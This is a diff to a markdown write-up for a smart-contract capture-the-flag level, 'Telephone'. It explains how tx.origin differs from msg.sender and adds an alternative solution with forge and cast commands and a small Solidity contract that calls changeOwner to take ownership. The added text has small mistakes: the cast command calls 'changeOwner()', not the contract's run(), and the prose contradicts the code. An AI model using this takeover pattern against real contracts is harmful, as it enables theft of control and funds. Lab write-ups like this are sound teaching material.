@@ -16,7 +16,7 @@
 
 <br>
 
-* in this challenge, we exploit the difference between `tx.origin` and `msg.sender` to to *phish* with `tx.origin` and become `owner`.
+* in this challenge, we exploit the difference between solidity's global variables `tx.origin` and `msg.sender` to to *phish* with `tx.origin` and become `owner`.
     - `tx.origin` refers to the EOA that initiated the transaction (which can be many calls ago, and never be a contract), while `msg.sender` is the immediate caller (and can be a contract).
 
 <br>
@@ -203,6 +203,56 @@ contract Exploit is Script {
 
 ```shell
 > forge script ./script/04/Telephone.s.sol --broadcast -vvvv --rpc-url sepolia
+```
+
+<br>
+
+----
+
+### alternative solution with `cast`
+
+<br>
+
+* instead of relying on our deploying script, a second options is deploying the contract directly with:
+
+<br>
+
+```shell
+> forge create src/04/TelephoneExploit.sol:TelephoneExploit --constructor-args <level address> --private-key=<private-key>
+```
+
+<br>
+
+* note that we would have to slightly modify our exploit to create an instance of `Telephone` instead of receiving it as an argument (with `level`). something like this:
+
+<br>
+
+```solidity
+interface Telephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneExploit {
+    Telephone level;
+
+    constructor(address _levelInstance) {
+       level = Telephone(_levelInstance);
+    } 
+    
+    function run() public {
+        level.changeOwner(msg.sender);
+  }
+}
+```
+
+<br>
+
+* to call the exploit, we run:
+
+<br>
+
+```solidity
+> cast send <deployted address> "changeOwner()" --private-key=<private-key>
 ```
 
 <br>
